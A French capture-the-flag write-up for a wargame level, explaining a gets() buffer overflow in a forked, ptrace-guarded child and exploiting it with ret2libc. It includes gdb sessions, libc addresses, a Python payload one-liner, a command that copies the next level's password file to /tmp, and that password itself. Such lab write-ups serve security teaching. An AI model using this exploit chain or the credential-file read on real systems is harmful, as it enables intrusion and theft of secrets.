# Level04

## Analyse

- Nous avons un programme avec une fonction main qui utilise la fonction fork() pour creer un processus enfant.

### Parent

- Le processus parent wait() le fils et le surveille avec ptrace().

- Le parent bloque l'utilisation de execve() dans l'enfant. Donc bloque l'utilisation de shellcode ou un execve est execute pour lancer un "/bin/sh". La comparaison de retour de la fonction ptrace() avec 11 est la pour bloquer les appels system a exec() car 11 est le numero du syscall a exec().

### Enfant

- prctl permet de configurer le signal envoye au processus si son parent meurt. SIGTERM est donc le signal qui sera envoye.

- ptrace() indique que ce processus doit etre trace par son parent, permet donc de surveiller et controler l'execution de l'enfant

- Le processus enfant utilise gets() qui est vulnerable aux buffer overflow. Le buffer alloue sur la stack est de 128 bytes.

## Exploitation

- On connait l'utilisation d'exploit comme le ret2libc qui permet de rediriger le flux d'execution vers un system("/bin/sh") et qui contourne la protection du exec().

- On peut trouver l'offset de la modification du saved eip de la fonction en envoyant un buffer overflow pattern. La particularite ici est qu'il n'y aura pas de segmentation fault car le parent wait(1) et le process run a l'infini. Il existe une option sur gdb pour suivre l'execution du fils : set follow-fork-mode child. En activant cette option on arrive a voir le segmentation fault et obtenir l'offset.

```
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 2252]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2252]
0x41326641 in ?? ()
```

- L'offset est de 156.

## Payload

- Il nous faut maintenant constituer notre payload, pour cela il nous faut l'adresse de system(), exit(), "/bin/sh".

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info proc mappings 
process 2253
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
         0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fda000 0xf7fdb000     0x1000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2b000, +0x1a0000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"
```

- On a maintenant toutes les informations pour constituer notre payload 
: 
```
    system: 0xf7e6aed0
    exit: 0xf7e5eb70
    /bin/sh: 0xf7f897ec
```

### Commande

```
(python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat) | ./level04
```

- Pour obtenir le flag il faut effectuer une redirection vers un fichier pour pouvoir lire la sortie.

```
cat /home/users/level05/.pass > /tmp/flag

cat /tmp/flag
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```